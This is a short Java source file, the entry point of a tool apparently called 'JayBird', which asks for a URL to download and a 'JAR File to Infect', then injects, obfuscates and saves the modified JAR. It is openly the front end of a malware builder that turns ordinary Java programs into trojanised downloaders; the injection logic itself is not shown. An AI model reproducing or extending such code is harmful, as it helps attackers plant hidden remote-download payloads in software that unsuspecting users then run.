import util.misc.Settings;

import javax.swing.*;

public class Application {
    public static void main(String[] args) {
        System.out.println("Starting JayBird v" + Settings.VERSION);
        System.out.println("Created by Contra. Visit RECoders.org");
        String url;
        String file;
        if (args.length == 0) {
            url = JOptionPane.showInputDialog("File to Download (URL):");
            file = JOptionPane.showInputDialog("JAR File to Infect:");
        } else {
            file = args[0];
            url = args[1];
        }
        Injector inf = new Injector(file, url);
        inf.load();
        inf.inject();
        inf.obfuscate();
        inf.save();
        close("Process Completed!");
    }

    public static void close(String msg) {
        JOptionPane.showMessageDialog(null, msg);
        System.exit(1337);
    }
}
